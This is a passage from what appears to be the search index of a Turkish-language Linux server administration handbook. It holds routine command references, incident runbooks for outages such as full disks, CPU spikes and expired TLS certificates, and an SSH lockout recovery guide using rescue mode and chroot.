ver (En g\u00fcvenli)\nchmod 600 id_rsa\n\n# Klas\u00f6r ve i\u00e7indekilerin sahipli\u011fini de\u011fi\u015ftir\nchown -R www-data:www-data /var/www/html\n</code></pre>"},{"location":"reference/commands/file/#4-arsivleme-tar-zip","title":"4. Ar\u015fivleme (Tar &amp; Zip)","text":"<pre><code># Klas\u00f6r\u00fc s\u0131k\u0131\u015ft\u0131r (tar.gz)\ntar -czvf yedek.tar.gz /var/www\n\n# Ar\u015fivi a\u00e7\ntar -xzvf yedek.tar.gz\n\n# Zip a\u00e7ma\nunzip dosya.zip\n</code></pre>"},{"location":"reference/commands/network/","title":"A\u011f ve Ba\u011flant\u0131 Komutlar\u0131","text":"<p>Portlar, IP adresleri ve ba\u011flant\u0131 testleri i\u00e7in \u0130svi\u00e7re \u00e7ak\u0131s\u0131 komutlar.</p>"},{"location":"reference/commands/network/#1-port-kontrolu-netstat-muadili","title":"1. Port Kontrol\u00fc (Netstat muadili)","text":"<p>Hangi servis hangi portu dinliyor?</p> <pre><code># Dinleyen portlar\u0131 g\u00f6ster (Process ID ile beraber)\nsudo ss -lntp\n\n# l: listening, n: numeric, t: tcp, p: process\n</code></pre>"},{"location":"reference/commands/network/#2-ip-adresleri","title":"2. IP Adresleri","text":"<pre><code># IP adreslerini g\u00f6ster\nip a\n# veya\nip addr show\n\n# Routing tablosu (Gateway neresi?)\nip route\n</code></pre>"},{"location":"reference/commands/network/#3-baglant-testi-curl-ping","title":"3. Ba\u011flant\u0131 Testi (Curl &amp; Ping)","text":"<pre><code># Bir siteye ba\u011flanabiliyor muyum? (Sadece ba\u015fl\u0131klar\u0131 al)\ncurl -I https://google.com\n\n# DNS \u00e7\u00f6z\u00fcl\u00fcyor mu?\ndig google.com +short\n# veya\nnslookup google.com\n\n# Port a\u00e7\u0131k m\u0131? (Telnet yerine nc kullan\u0131l\u0131r)\nnc -zv 127.0.0.1 22\n# Connection refused -&gt; Port kapal\u0131 veya servis yok\n# Succeeded -&gt; Port a\u00e7\u0131k\n</code></pre>"},{"location":"reference/commands/system/","title":"Sistem ve S\u00fcre\u00e7 (Process) Y\u00f6netimi","text":"<p>Servisleri y\u00f6netmek ve kilitlenen programlar\u0131 sonland\u0131rmak.</p>"},{"location":"reference/commands/system/#1-servis-yonetimi-systemd","title":"1. Servis Y\u00f6netimi (Systemd)","text":"<pre><code># Servis durumu\nsystemctl status nginx\n\n# Ba\u015flat / Durdur / Yeniden Ba\u015flat\nsudo systemctl start nginx\nsudo systemctl stop nginx\nsudo systemctl restart nginx\n\n# Ba\u015flang\u0131\u00e7ta a\u00e7\u0131ls\u0131n / a\u00e7\u0131lmas\u0131n\nsudo systemctl enable nginx\nsudo systemctl disable nginx\n\n# Ba\u015far\u0131s\u0131z olan servisleri listele\nsystemctl --failed\n\n# Geli\u015fmi\u015f Status Parametreleri\nsystemctl status nginx --no-pager  # Pager (less) kullanmadan \u00e7\u0131kt\u0131 ver\nsystemctl status nginx -l          # Sat\u0131rlar\u0131 kesme (Full log)\nsystemctl status nginx -n 50       # Son 50 sat\u0131r logu g\u00f6ster\n</code></pre>"},{"location":"reference/commands/system/#servis-duzenleme-advanced","title":"Servis D\u00fczenleme (Advanced)","text":"<p>Servis dosyas\u0131n\u0131 (<code>/lib/systemd/system/...</code>) elle a\u00e7mak yerine bu komutu kullan\u0131n. Bu, yap\u0131lan de\u011fi\u015fiklikleri <code>/etc/systemd/system/</code> alt\u0131na g\u00fcvenli bir kopya (override) olarak kaydeder.</p> <pre><code>sudo systemctl edit nginx --full\n</code></pre>"},{"location":"reference/commands/system/#2-log-inceleme-journalctl","title":"2. Log \u0130nceleme (Journalctl)","text":"<p>Systemd servislerinin loglar\u0131na bakmak i\u00e7in <code>journalctl</code> kullan\u0131l\u0131r.</p> <pre><code># Bir servisin loglar\u0131n\u0131 g\u00f6r (Son sayfadan ba\u015fla)\njournalctl -u nginx -e\n\n# Canl\u0131 izle (Tail -f gibi)\njournalctl -u ssh -f\n\n# Sadece bug\u00fcnk\u00fc loglar\njournalctl -u nginx --since \"today\"\n</code></pre>"},{"location":"reference/commands/system/#3-surec-yonetimi-ps-kill","title":"3. S\u00fcre\u00e7 Y\u00f6netimi (Ps &amp; Kill)","text":"<p>Bir program donarsa ne yap\u0131l\u0131r?</p> <pre><code># \u00c7al\u0131\u015fan s\u00fcre\u00e7leri listele\nps aux | grep python\n\n# Bir s\u00fcreci \u00f6ld\u00fcr (PID numaras\u0131n\u0131 ps ile bulup yaz\u0131n)\nkill 1234\n\n# Zorla \u00f6ld\u00fcr (Force kill - Dikkatli kullan\u0131n)\nkill -9 1234\n\n# \u0130sme g\u00f6re \u00f6ld\u00fcr\npkill -f \"python main.py\"\n</code></pre>"},{"location":"runbooks/","title":"Runbooks","text":"<p>Bu bolum, production ortamda mudahale adimlarini toplar.</p>"},{"location":"runbooks/#icerik","title":"Icerik","text":"<ul> <li>Olay yonetimi</li> <li>Deploy geri alma</li> <li>Disk dolu mudahalesi</li> <li>Servis kesintisi</li> <li>Veritabani down</li> <li>CPU spike</li> <li>TLS yenileme sorunu</li> <li>Disk IO krizi</li> <li>OOM kill / memory leak</li> <li>Inode dolu</li> <li>DNS sorunlari</li> <li>Network latency spike</li> <li>Load balancer healthcheck fail</li> <li>DDoS / rate limit</li> <li>Sertifika suresi doldu</li> <li>Replication lag</li> <li>Backup restore basarisiz</li> <li>Config deploy hatasi</li> <li>SSH erisim kesildi</li> </ul>"},{"location":"runbooks/backup-restore-fail/","title":"Backup Restore Basarisiz","text":"<p>Bu runbook, geri donus testinin basarisiz oldugu durumlari kapsar.</p>"},{"location":"runbooks/backup-restore-fail/#hazirlik","title":"Hazirlik","text":"<ul> <li>Hangi yedegin sorunlu oldugunu belirle.</li> </ul>"},{"location":"runbooks/backup-restore-fail/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Yedek dosya butunlugunu kontrol et.</li> <li>Alternatif yedek surumunu dene.</li> <li>Geri donus adimlarini belgele.</li> </ol>"},{"location":"runbooks/backup-restore-fail/#dogrulama","title":"Dogrulama","text":"<ul> <li>Geri donus basarili mi?</li> <li>Hedef veriler dogru mu?</li> </ul>"},{"location":"runbooks/cert-expired/","title":"Sertifika Suresi Doldu","text":"<p>Bu runbook, TLS sertifikasi suresi doldugunda uygulanacak adimlari kapsar.</p>"},{"location":"runbooks/cert-expired/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen domainleri belirle.</li> </ul>"},{"location":"runbooks/cert-expired/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Sertifika durumunu kontrol et.</li> <li>Yenileme yap ve Nginx'i reload et.</li> <li>Yenileme otomasyonunu dogrula.</li> </ol>"},{"location":"runbooks/cert-expired/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>openssl s_client -connect example.com:443 -servername example.com\ncertbot renew\nsystemctl reload nginx\n</code></pre>"},{"location":"runbooks/cert-expired/#dogrulama","title":"Dogrulama","text":"<ul> <li>Sertifika tarihi guncellendi mi?</li> </ul>"},{"location":"runbooks/config-deploy-fail/","title":"Config Deploy Hatasi","text":"<p>Bu runbook, config veya env hatasindan kaynakli deploy sorunlarini kapsar.</p>"},{"location":"runbooks/config-deploy-fail/#hazirlik","title":"Hazirlik","text":"<ul> <li>Son degisiklikleri not et.</li> <li>Hangi config'in deploy edildigini belirle.</li> </ul>"},{"location":"runbooks/config-deploy-fail/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Config diff kontrol et.</li> <li>Eksik env degiskenlerini tamamla.</li> <li>Gerekirse onceki config'e don.</li> </ol>"},{"location":"runbooks/config-deploy-fail/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>env | rg \"APP_\"\n</code></pre>"},{"location":"runbooks/config-deploy-fail/#dogrulama","title":"Dogrulama","text":"<ul> <li>Uygulama dogru config ile ayakta mi?</li> </ul>"},{"location":"runbooks/cpu-spike/","title":"CPU Spike","text":"<p>Bu runbook, CPU kullanimi aniden arttiginda teshis ve stabilizasyonu kapsar.</p>"},{"location":"runbooks/cpu-spike/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen host ve servisleri belirle.</li> <li>Zaman araligini not et.</li> </ul>"},{"location":"runbooks/cpu-spike/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>CPU kullanimini ve en cok kaynak tuketen surecleri belirle.</li> <li>Son degisiklikleri kontrol et.</li> <li>Gerekirse servisleri yeniden baslat veya limit uygula.</li> </ol>"},{"location":"runbooks/cpu-spike/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>top -o %CPU\nps -eo pid,comm,%cpu --sort=-%cpu | head\nsystemctl restart app\n</code></pre>"},{"location":"runbooks/cpu-spike/#dogrulama","title":"Dogrulama","text":"<ul> <li>CPU kullanimi normale dondu mu?</li> <li>Alarm kapanis oldu mu?</li> </ul>"},{"location":"runbooks/db-down/","title":"Veritabani Down","text":"<p>Bu runbook, veritabani erisilemez oldugunda temel mudahale adimlarini icerir.</p>"},{"location":"runbooks/db-down/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen servisleri ve bagimliliklari belirle.</li> <li>Son degisiklikleri not et.</li> </ul>"},{"location":"runbooks/db-down/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Servis durumu kontrol et.</li> <li>Disk ve bellek kullanimini kontrol et.</li> <li>Baglanti limitlerini ve loglari incele.</li> <li>Gerekirse servisi yeniden baslat.</li> </ol>"},{"location":"runbooks/db-down/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>systemctl status postgresql\njournalctl -u postgresql --since \"30 min ago\"\nfree -m\ndf -h\nsystemctl restart postgresql\n</code></pre>"},{"location":"runbooks/db-down/#dogrulama","title":"Dogrulama","text":"<ul> <li>Uygulama DB baglantisi duzeldi mi?</li> <li>Hata oranlari normale dondu mu?</li> </ul>"},{"location":"runbooks/ddos-rate-limit/","title":"DDoS / Rate Limit","text":"<p>Bu runbook, ani trafik artisi ve rate limit ihtiyacini kapsar.</p>"},{"location":"runbooks/ddos-rate-limit/#hazirlik","title":"Hazirlik","text":"<ul> <li>Trafik kaynagini ve hedef endpointleri belirle.</li> </ul>"},{"location":"runbooks/ddos-rate-limit/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Trafik kaynagini analiz et.</li> <li>Rate limit veya WAF kurallarini uygula.</li> <li>Gerekirse gecici IP bloklama yap.</li> </ol>"},{"location":"runbooks/ddos-rate-limit/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>sudo ufw limit ssh\nsudo ufw deny from 203.0.113.0/24\n</code></pre>"},{"location":"runbooks/ddos-rate-limit/#dogrulama","title":"Dogrulama","text":"<ul> <li>Trafik stabil mi?</li> <li>Legit istekler etkilenmedi mi?</li> </ul>"},{"location":"runbooks/deploy-rollback/","title":"Deploy Geri Alma","text":"<p>Bu runbook, hatali deploy sonrasinda hizli geri donus adimlarini icerir.</p>"},{"location":"runbooks/deploy-rollback/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen servis ve surumu belirle.</li> <li>Son saglam surum etiketini not et.</li> </ul>"},{"location":"runbooks/deploy-rollback/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Yeni deployu durdur.</li> <li>Bir onceki stabil surume geri don.</li> <li>Servisi yeniden baslat.</li> <li>Loglari incele ve hatayi kaydet.</li> </ol>"},{"location":"runbooks/deploy-rollback/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>systemctl stop app\n# ornek: git tag ile geri donus\ngit checkout v1.2.3\nsystemctl start app\n</code></pre>"},{"location":"runbooks/deploy-rollback/#dogrulama","title":"Dogrulama","text":"<ul> <li>Servis saglik kontrolu basarili mi?</li> <li>Kullanici hatalari normale dondu mu?</li> </ul>"},{"location":"runbooks/disk-full/","title":"Disk Dolu Mudahalesi","text":"<p>Bu runbook, disk dolulugu durumunda hizli stabilizasyonu kapsar.</p>"},{"location":"runbooks/disk-full/#hazirlik","title":"Hazirlik","text":"<ul> <li>Hangi bolumun dolu oldugunu belirle.</li> <li>Buyuk dosya ve dizinleri tespit et.</li> </ul>"},{"location":"runbooks/disk-full/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Disk kullanimini kontrol et.</li> <li>Buyuk dosyalari listele.</li> <li>Gereksiz log ve cache dosyalarini temizle.</li> <li>Log rotasyonunu dogrula.</li> </ol>"},{"location":"runbooks/disk-full/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>df -h\nsudo du -sh /var/log/* | sort -h\nsudo journalctl --vacuum-time=7d\n</code></pre>"},{"location":"runbooks/disk-full/#dogrulama","title":"Dogrulama","text":"<ul> <li>Disk dolulugu kritik esik altina indi mi?</li> <li>Servisler tekrar stabil mi?</li> </ul>"},{"location":"runbooks/disk-full/#ilgili-runbook","title":"Ilgili runbook","text":"<ul> <li>Inode sorunu icin: Inode Dolu</li> </ul>"},{"location":"runbooks/disk-io/","title":"Disk IO Krizi","text":"<p>Bu runbook, disk IO saturation durumunda teshis ve azaltma adimlarini kapsar.</p>"},{"location":"runbooks/disk-io/#hazirlik","title":"Hazirlik","text":"<ul> <li>IO darbogazini dogrula.</li> <li>Etkilenen servisleri listele.</li> </ul>"},{"location":"runbooks/disk-io/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>IO kullanimini kontrol et.</li> <li>En cok IO yapan surecleri belirle.</li> <li>Gerekirse servisi gecici durdur veya limit uygula.</li> </ol>"},{"location":"runbooks/disk-io/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>iostat -xz 1 5\npidstat -d 1 5\nsystemctl stop batch-job\n</code></pre>"},{"location":"runbooks/disk-io/#dogrulama","title":"Dogrulama","text":"<ul> <li>IO bekleme sureleri dustu mu?</li> <li>Servisler stabil mi?</li> </ul>"},{"location":"runbooks/dns-issues/","title":"DNS Sorunlari","text":"<p>Bu runbook, domain resolve edilemiyorsa teshis adimlarini kapsar.</p>"},{"location":"runbooks/dns-issues/#hazirlik","title":"Hazirlik","text":"<ul> <li>Domain ve etkilenen servisleri belirle.</li> </ul>"},{"location":"runbooks/dns-issues/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>DNS kayitlarini kontrol et.</li> <li>Resolver ayarlarini dogrula.</li> <li>Gecici olarak alternatif DNS kullan.</li> </ol>"},{"location":"runbooks/dns-issues/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>dig example.com\ncat /etc/resolv.conf\nnslookup example.com 1.1.1.1\n</code></pre>"},{"location":"runbooks/dns-issues/#dogrulama","title":"Dogrulama","text":"<ul> <li>DNS sorgulari dogru yanit veriyor mu?</li> </ul>"},{"location":"runbooks/incident-response/","title":"Olay Yonetimi","text":"<p>Bu runbook, production olaylarinda temel mudahale adimlarini icerir.</p>"},{"location":"runbooks/incident-response/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etki alanini belirle.</li> <li>Istek sahibini ve ilgili ekibi bilgilendir.</li> </ul>"},{"location":"runbooks/incident-response/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Semptomlari kaydet (zaman, servis, hata kodu).</li> <li>Kritik loglari al ve sakla.</li> <li>Gecici stabilizasyon uygula (or: yeniden baslatma).</li> <li>Kok nedeni bul ve kalici cozum uygula.</li> </ol>"},{"location":"runbooks/incident-response/#dogrulama","title":"Dogrulama","text":"<ul> <li>Servis stabil mi?</li> <li>Tekrar etme riski dusuruldu mu?</li> </ul>"},{"location":"runbooks/inode-full/","title":"Inode Dolu","text":"<p>Bu runbook, inode tukendiginde teshis ve temizligi kapsar.</p>"},{"location":"runbooks/inode-full/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen dosya sistemi belirle.</li> </ul>"},{"location":"runbooks/inode-full/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Inode kullanimini kontrol et.</li> <li>Cok sayida kucuk dosya olusturan dizinleri bul.</li> <li>Gereksiz dosyalari temizle.</li> </ol>"},{"location":"runbooks/inode-full/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>df -i\nsudo find /var/log -type f | wc -l\nsudo find /var/log -type f -mtime +7 -delete\n</code></pre>"},{"location":"runbooks/inode-full/#dogrulama","title":"Dogrulama","text":"<ul> <li>Inode kullanimi kritik esik altina indi mi?</li> </ul>"},{"location":"runbooks/inode-full/#ilgili-runbook","title":"Ilgili runbook","text":"<ul> <li>Genel disk teshisi icin: Disk Dolu Mudahalesi</li> </ul>"},{"location":"runbooks/lb-healthcheck/","title":"Load Balancer Healthcheck Fail","text":"<p>Bu runbook, load balancer healthcheck hatalarini kapsar.</p>"},{"location":"runbooks/lb-healthcheck/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen hedefleri ve healthcheck path'ini belirle.</li> </ul>"},{"location":"runbooks/lb-healthcheck/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Uygulama healthcheck endpointini test et.</li> <li>Nginx veya upstream konfigu kontrol et.</li> <li>Gerekirse healthcheck timeoutlarini arttir.</li> </ol>"},{"location":"runbooks/lb-healthcheck/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>curl -I http://127.0.0.1/healthz\nnginx -t\n</code></pre>"},{"location":"runbooks/lb-healthcheck/#dogrulama","title":"Dogrulama","text":"<ul> <li>Load balancer hedefleri healthy mi?</li> </ul>"},{"location":"runbooks/network-latency/","title":"Network Latency Spike","text":"<p>Bu runbook, ag gecikmesi artisinda teshis ve azaltma adimlarini kapsar.</p>"},{"location":"runbooks/network-latency/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen route ve servisleri belirle.</li> </ul>"},{"location":"runbooks/network-latency/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Temel latency olcumu yap.</li> <li>Packet loss kontrol et.</li> <li>Kritik servislere oncelik ver.</li> </ol>"},{"location":"runbooks/network-latency/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>ping -c 20 8.8.8.8\nmtr -rw example.com\n</code></pre>"},{"location":"runbooks/network-latency/#dogrulama","title":"Dogrulama","text":"<ul> <li>Latency normale dondu mu?</li> <li>Packet loss azaldi mi?</li> </ul>"},{"location":"runbooks/oom-kill/","title":"OOM Kill / Memory Leak","text":"<p>Bu runbook, bellek tukenmesi ve OOM kill durumlarini kapsar.</p>"},{"location":"runbooks/oom-kill/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen servisleri belirle.</li> <li>Son degisiklikleri not et.</li> </ul>"},{"location":"runbooks/oom-kill/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Bellek kullanimini kontrol et.</li> <li>OOM loglarini incele.</li> <li>Gerekirse servisi yeniden baslat veya kaynak limit uygula.</li> </ol>"},{"location":"runbooks/oom-kill/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>free -m\njournalctl -k | rg -i \"oom|out of memory\"\nsystemctl restart app\n</code></pre>"},{"location":"runbooks/oom-kill/#dogrulama","title":"Dogrulama","text":"<ul> <li>Bellek kullanimi normale dondu mu?</li> <li>OOM kill tekrar etti mi?</li> </ul>"},{"location":"runbooks/replication-lag/","title":"Replication Lag","text":"<p>Bu runbook, veritabani replikasyon gecikmesi durumunu kapsar.</p>"},{"location":"runbooks/replication-lag/#hazirlik","title":"Hazirlik","text":"<ul> <li>Primary/replica rollerini belirle.</li> </ul>"},{"location":"runbooks/replication-lag/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Replikasyon durumunu kontrol et.</li> <li>Disk ve IO durumunu incele.</li> <li>Gerekirse replica'yi yeniden senkronize et.</li> </ol>"},{"location":"runbooks/replication-lag/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code># Postgres ornegi\npsql -c \"select now() - pg_last_xact_replay_timestamp();\"\n</code></pre>"},{"location":"runbooks/replication-lag/#dogrulama","title":"Dogrulama","text":"<ul> <li>Lag kabul edilebilir seviyede mi?</li> </ul>"},{"location":"runbooks/service-down/","title":"Servis Kesintisi","text":"<p>Bu runbook, servis down durumunda temel teshis ve geri getirme adimlarini icerir.</p>"},{"location":"runbooks/service-down/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen servis ve bagimli servisleri belirle.</li> <li>Son degisiklikleri not et.</li> </ul>"},{"location":"runbooks/service-down/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Servis durumunu kontrol et.</li> <li>Loglari incele.</li> <li>Kaynak kullanimini kontrol et.</li> <li>Gerekirse servisi yeniden baslat.</li> </ol>"},{"location":"runbooks/service-down/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>systemctl status app\njournalctl -u app --since \"30 min ago\"\nfree -m\nsystemctl restart app\n</code></pre>"},{"location":"runbooks/service-down/#dogrulama","title":"Dogrulama","text":"<ul> <li>Saglik kontrolu basarili mi?</li> <li>Hata oranlari normale dondu mu?</li> </ul>"},{"location":"runbooks/ssh-lockout/","title":"Acil Durum: SSH Eri\u015fimi Kesildi (Break Glass)","text":"<p>Sunucuya SSH ile eri\u015femedi\u011finizde uygulayaca\u011f\u0131n\u0131z kurtarma (recovery) protokol\u00fc.</p> <p>[!WARNING] Bu ad\u0131mlar sunucu sa\u011flay\u0131c\u0131n\u0131z\u0131n y\u00f6netim paneline eri\u015fim gerektirir.</p>"},{"location":"runbooks/ssh-lockout/#semptomlar","title":"Semptomlar","text":"<ul> <li><code>Connection refused</code> (Servis kapal\u0131 veya port yanl\u0131\u015f)</li> <li><code>Permission denied (publickey)</code> (Anahtar yanl\u0131\u015f veya silinmi\u015f)</li> <li><code>Operation timed out</code> (Firewall engelliyor)</li> </ul>"},{"location":"runbooks/ssh-lockout/#yontem-1-vnc-lish-console-interaktif","title":"Y\u00f6ntem 1: VNC / LISH Console (\u0130nteraktif)","text":"<p>\u00c7o\u011fu sa\u011flay\u0131c\u0131 (AWS, DigitalOcean, Hetzner, Linode) web \u00fczerinden do\u011frudan terminal eri\u015fimi sunar.</p> <ol> <li>Panelden sunucuyu se\u00e7in.</li> <li>Console veya VNC butonuna t\u0131klay\u0131n.</li> <li>Web terminali a\u00e7\u0131lacakt\u0131r. Burada a\u011f ba\u011flant\u0131s\u0131 gerekmez, do\u011frudan klavye/ekran ba\u011fl\u0131 gibidir.</li> <li>Kullan\u0131c\u0131 Ad\u0131: <code>root</code> (veya sudo yetkili kullan\u0131c\u0131n\u0131z)</li> <li>Parola: Kurulumda belirledi\u011finiz root parolas\u0131.</li> </ol> <p>[!TIP] Root parolas\u0131 kapal\u0131ysa (<code>PermitRootLogin no</code>), bu y\u00f6ntem i\u015fe yaramayabilir. E\u011fer sudo kullan\u0131c\u0131n\u0131z\u0131n parolas\u0131n\u0131 biliyorsan\u0131z onunla girin.</p>"},{"location":"runbooks/ssh-lockout/#yontem-2-rescue-mode-kurtarma-modu","title":"Y\u00f6ntem 2: Rescue Mode (Kurtarma Modu)","text":"<p>Parolalar\u0131 bilmiyorsan\u0131z veya disk bozulduysa bu y\u00f6ntemi kullan\u0131n.</p> <ol> <li>Panelden sunucuyu Power Off yap\u0131n.</li> <li>Rescue Mode veya Boot from ISO se\u00e7ene\u011fini bulun.</li> <li>Sunucuyu ba\u015flat\u0131n. Ge\u00e7ici bir i\u015fletim sistemi (RAM \u00fczerinden) a\u00e7\u0131lacakt\u0131r.</li> <li>Size ge\u00e7ici bir root parolas\u0131 verilir, Rescue konsoluna ba\u011flan\u0131n.</li> </ol>"},{"location":"runbooks/ssh-lockout/#disk-baglama-mount","title":"Disk Ba\u011flama (Mount)","text":"<p>Kendi sunucu diskinize eri\u015fmek i\u00e7in onu ba\u011flaman\u0131z (mount) gerekir.</p> <pre><code># Diskleri listele\nlsblk\n# Genellikle ana disk /dev/sda1 veya /dev/vda1 olur.\n\n# Mount et\nmount /dev/sda1 /mnt\n</code></pre>"},{"location":"runbooks/ssh-lockout/#chroot-iceri-girme","title":"Chroot (\u0130\u00e7eri Girme)","text":"<p>Art\u0131k <code>/mnt</code> klas\u00f6r\u00fc sizin sunucunuzun k\u00f6k dizini. Oraya ge\u00e7i\u015f yap\u0131n:</p> <pre><code># Gerekli sistem klas\u00f6rlerini ba\u011fla (Opsiyonel ama \u00f6nerilir)\nmount -t proc none /mnt/proc\nmount -o bind /dev /mnt/dev\n\n# Sisteme gir\nchroot /mnt\n</code></pre> <p>Art\u0131k kendi sunucunuzun i\u00e7indesiniz!</p>"},{"location":"runbooks/ssh-lockout/#cozum-admlar","title":"\u00c7\u00f6z\u00fcm Ad\u0131mlar\u0131","text":"<p>\u0130\u00e7eri girdikten sonra (Console veya Rescue Chroot):</p>"},{"location":"runbooks/ssh-lockout/#a-firewallu-kapatmak-erisimi-acmak-icin","title":"A. Firewall'u Kapatmak (Eri\u015fimi a\u00e7mak i\u00e7in)","text":"<pre><code>ufw disable\n# veya\niptables -F\n</code></pre>"},{"location":"runbooks/ssh-lockout/#b-ssh-ayarlarn-duzeltmek","title":"B. SSH Ayarlar\u0131n\u0131 D\u00fczeltmek","text":"<p>Yanl\u0131\u015f bir ayar yapt\u0131ysan\u0131z dosyay\u0131 d\u00fczenleyin:</p> <pre><code>nano /etc/ssh/sshd_config\n# PermitRootLogin yes (Ge\u00e7ici olarak a\u00e7\u0131n)\n# PasswordAuthentication yes (Ge\u00e7ici olarak a\u00e7\u0131n)\n</code></pre>"},{"location":"runbooks/ssh-lockout/#c-loglar-kontrol-etmek","title":"C. Loglar\u0131 Kontrol Etmek","text":"<p>Neden giremedi\u011finizi g\u00f6rmek i\u00e7in:</p> <pre><code>journalctl -u ssh -e\ntail -f /var/log/auth.log\n</code></pre>"},{"location":"runbooks/ssh-lockout/#cks-ve-reboot","title":"\u00c7\u0131k\u0131\u015f ve Reboot","text":"<p>\u0130\u015flemler bitince normale d\u00f6n\u00fcn.</p> <ol> <li><code>exit</code> (Chroot'tan \u00e7\u0131k)</li> <li><code>umount /mnt</code> (Diski ay\u0131r)</li> <li>Panelden Rescue Mode'u kapat ve Normal Reboot at.</li> </ol>"},{"location":"runbooks/tls-renewal/","title":"TLS Yenileme Sorunu","text":"<p>Bu runbook, TLS sertifikasi yenileme hatalarinda takip edilecek adimlari icerir.</p>"},{"location":"runbooks/tls-renewal/#hazirlik","title":"Hazirlik","text":"<ul> <li>Etkilenen domainleri belirle.</li> <li>Son certbot loglarini kontrol et.</li> </ul>"},{"location":"runbooks/tls-renewal/#mudahale-adimlari","title":"Mudahale adimlari","text":"<ol> <li>Certbot timer durumunu kontrol et.</li> <li>Manuel yenileme dene.</li> <li>Nginx konfig ve DNS dogrulugunu kontrol et.</li> </ol>"},{"location":"runbooks/tls-renewal/#ornek-komutlar","title":"Ornek komutlar","text":"<pre><code>systemctl status certbot.timer\ncertbot renew --dry-run\nnginx -t\n</code></pre>"},{"location":"runbooks/tls-renewal/#dogrulama","title":"Dogrulama","text":"<ul> <li>Yenileme basarili mi?</li> <li>HTTPS sertifikasi guncellendi mi?</li> </ul>"},{"location":"runbooks/tls-renewal/#not","title":"Not","text":"<ul> <li>Kurulum adimlari icin: TLS (Let's Encrypt)</li> </ul>"},{"location":"scripts/","title":"Script Repository &amp; Otomasyon Standartlar\u0131","text":"<p>Bu b\u00f6l\u00fcm, sunucu y\u00f6netiminde kulland\u0131\u011f\u0131m\u0131z scriptlerin (<code>.sh</code>, <code>.py</code>) nas\u0131l yaz\u0131lmas\u0131, \u00e7al\u0131\u015ft\u0131r\u0131lmas\u0131 ve korunmas\u0131 gerekti\u011fini anlatan anayasam\u0131zd\u0131r.</p>"},{"location":"scripts/#1-yazm-kurallar-conventions","title":"1. Yaz\u0131m Kurallar\u0131 (Conventions)","text":"<p>Script Yaz\u0131m Standartlar\u0131 sayfas\u0131nda:</p> <ul> <li>Bash Strict Mode (<code>set -euo pipefail</code>) neden zorunludur?</li> <li>De\u011fi\u015fken isimlendirme ve loglama formatlar\u0131.</li> <li>Kopyala-yap\u0131\u015ft\u0131r yapabilece\u011finiz haz\u0131r \u015fablon (boilerplate).</li> </ul>"},{"location":"scripts/#2-calstrma-yontemleri-execution","title":"2. \u00c7al\u0131\u015ft\u0131rma Y\u00f6ntemleri (Execution)","text":"<p>Script \u00c7al\u0131\u015ft\u0131rma Standartlar\u0131 sayfas\u0131nda:</p> <ul> <li>Neden Cron yerine Systemd Timers kullanmal\u0131y\u0131z?</li> <li>Arkaplan i\u015flemleri ve log y\u00f6netimi.</li> </ul>"},{"location":"scripts/#3-guvenlik-safety","title":"3. G\u00fcvenlik (Safety)","text":"<p>Script G\u00fcvenli\u011fi sayfas\u0131nda:</p> <ul> <li>\u015eifre y\u00f6netimi (<code>.env</code> vs Hardcoded).</li> <li><code>curl | bash</code> riskleri.</li> <li>Least Privilege (En az yetki) kural\u0131.</li> </ul>"},{"location":"scripts/#4-otomasyon-vizyonu","title":"4. Otomasyon Vizyonu","text":"<p>Otomasyon Vizyonu sayfas\u0131nda:</p> <ul> <li>Terraform vs Ansible kar\u015f\u0131la\u015ft\u0131rmas\u0131.</li> <li>Gelecekteki \"Server Setup as a Service\" mimarisi.</li> </ul>"},{"location":"scripts/automation/","title":"Otomasyon Rehberi: GitHub Actions \ud83e\udd16","text":"<p>S\u00fcrekli sunucuya girip <code>git pull</code>, <code>docker compose up -d</code> yapmaktan yoruldunuz mu? GitHub Actions ile \"Push to Deploy\" (Kodu at, sunucu g\u00fcncellensin) yap\u0131s\u0131n\u0131 kural\u0131m.</p>"},{"location":"scripts/automation/#1-mantk-nedir","title":"1. Mant\u0131k Nedir?","text":"<ol> <li>Bilgisayar\u0131n\u0131zda kodu d\u00fczenler ve <code>git push</code> yapars\u0131n\u0131z.</li> <li>GitHub bunu 